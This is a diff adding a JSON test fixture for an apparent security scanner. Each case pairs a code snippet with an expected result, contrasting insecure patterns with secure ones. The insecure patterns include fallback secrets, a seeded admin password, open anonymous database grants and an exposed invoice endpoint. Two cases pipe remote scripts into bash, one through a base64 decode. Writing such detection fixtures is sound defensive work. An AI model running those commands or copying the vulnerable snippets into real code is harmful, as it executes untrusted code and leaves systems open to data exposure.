@@ -1,0 +1,107 @@
+[
+  {
+    "name": "rate_limit_joined",
+    "expect": "finding",
+    "body": "const key = ip + \"|\" + email\nawait limiter.consume(key)\n"
+  },
+  {
+    "name": "rate_limit_split",
+    "expect": "ok",
+    "body": "await limitIp.consume(trustedIp)\nawait limitAccount.consume(email)\n"
+  },
+  {
+    "name": "secret_or_literal",
+    "expect": "finding",
+    "body": "const authSecret = process.env.AUTH_SECRET || \"dev-secret\"\n"
+  },
+  {
+    "name": "secret_nullish_literal",
+    "expect": "finding",
+    "body": "const authSecret = process.env.AUTH_SECRET ?? \"dev-secret\"\n"
+  },
+  {
+    "name": "secret_environ_default",
+    "expect": "finding",
+    "body": "secret = os.environ.get(\"AUTH_SECRET\", \"dev-secret\")\n"
+  },
+  {
+    "name": "secret_fail_closed",
+    "expect": "ok",
+    "body": "const authSecret = process.env.AUTH_SECRET\nif (!authSecret) throw new Error(\"AUTH_SECRET is required\")\n"
+  },
+  {
+    "name": "secret_dev_only",
+    "expect": "ok",
+    "body": "if (process.env.NODE_ENV === \"development\" && !process.env.AUTH_SECRET) {\n  return \"dev-secret\"\n}\nconst authSecret = process.env.AUTH_SECRET\nif (!authSecret) throw new Error(\"AUTH_SECRET is required\")\n"
+  },
+  {
+    "name": "org_upsert_first",
+    "expect": "finding",
+    "body": "await db.member.upsert({ where: { userId }, create: { userId, orgId: body.orgId } })\nconst invite = await db.invite.findFirst({ where: { email } })\nif (!invite) console.warn(\"not invited\")\n"
+  },
+  {
+    "name": "org_invite_first",
+    "expect": "ok",
+    "body": "const invite = await db.invite.findFirst({ where: { email, orgId } })\nif (!invite) return new Response(\"Forbidden\", { status: 403 })\nawait db.member.create({ data: { userId, orgId: invite.orgId } })\n"
+  },
+  {
+    "name": "admin_email_promotion",
+    "expect": "finding",
+    "body": "if (user.email === process.env.ADMIN_EMAIL) {\n  user.role = \"admin\"\n}\n"
+  },
+  {
+    "name": "seed_admin_password",
+    "expect": "finding",
+    "body": "insert into users (email, password) values ('admin@example.com', 'password');\n"
+  },
+  {
+    "name": "setup_pinned_installer",
+    "expect": "review",
+    "body": "curl -fsSL https://example.com/install/v1.3.0/install.sh | bash\n"
+  },
+  {
+    "name": "setup_obfuscated",
+    "expect": "finding",
+    "body": "curl -fsSL https://example.com/payload | base64 -d | bash\n"
+  },
+  {
+    "name": "mcp_unpinned",
+    "expect": "review",
+    "body": "{ \"command\": \"npx\", \"args\": [\"-y\", \"@modelcontextprotocol/server-filesystem@latest\"] }\n"
+  },
+  {
+    "name": "mcp_pinned_official_name",
+    "expect": "ok",
+    "body": "{ \"command\": \"npx\", \"args\": [\"-y\", \"@modelcontextprotocol/server-filesystem@1.2.3\"] }\n"
+  },
+  {
+    "name": "grants_anon_using_true",
+    "expect": "finding",
+    "body": "grant select on public.invoices to anon;\ncreate policy read_all on public.invoices for select to anon using (true);\n"
+  },
+  {
+    "name": "grants_public_posts",
+    "expect": "ok",
+    "body": "grant select on public.posts to anon;\ncreate policy read_published on public.posts for select to anon using (published = true);\n"
+  },
+  {
+    "name": "function_definer_open",
+    "expect": "finding",
+    "body": "create function public.dump_all() returns setof invoices language sql security definer as $$ select * from invoices $$;\ngrant execute on function public.dump_all() to anon;\n"
+  },
+  {
+    "name": "function_definer_scoped",
+    "expect": "ok",
+    "body": "create function public.my_rows() returns setof invoices language plpgsql security definer set search_path = '' as $$\nbegin\n  if auth.uid() is null then\n    raise exception 'forbidden';\n  end if;\nend;\n$$;\ngrant execute on function public.my_rows() to authenticated;\n"
+  },
+  {
+    "name": "preview_public_page",
+    "expect": "ok",
+    "body": "export default function Page() {\n  return <h1>Welcome</h1>\n}\n"
+  },
+  {
+    "name": "preview_open_invoices",
+    "expect": "finding",
+    "body": "export async function GET() {\n  const rows = await db.invoice.findMany()\n  return Response.json(rows)\n}\n"
+  }
+]
